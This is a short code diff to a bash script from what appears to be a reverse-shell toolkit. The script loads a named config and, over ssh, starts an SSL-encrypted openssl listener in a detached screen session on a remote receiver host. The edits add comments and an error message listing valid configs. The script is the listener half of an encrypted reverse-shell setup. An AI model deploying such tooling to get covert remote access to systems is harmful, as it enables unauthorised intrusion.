@@ -7,16 +7,17 @@ BGREEN='\033[1;92m'
 NOCOLOR='\033[0m'
 
 cname=$1
-installdir=~/.ReverseShell
+installdir=~/.ReverseShell #For local only, remote is static
 
 if [ -f $installdir/$cname/$cname.cfg ]; then
 	. $installdir/$cname/$cname.cfg
 else
 	echo "error: $cname config not found! please check $installdir or run reverseshell_configmaker.sh again!!"
+	echo "valid configs: $(ls $installdir | xargs)"
 	exit 2
 fi
 
-#Start the listener (with ssl) on our remote(receiver) host
+#Start the listener (with ssl) on our remote(receiver) host via ssh
 ssh -t -p $sshport -l $sshuser $rhost "screen -dmS listener_$cname; screen -S listener_$cname -X stuff \"openssl s_server -quiet -key ~/.ReverseShell/$cname/key.pem -cert ~/.ReverseShell/$cname/cert.pem -port $rport\"`echo -ne '\015'`"
 #Keep it clean.
 rm -f /tmp/reversesocket_$cname 2> /dev/null
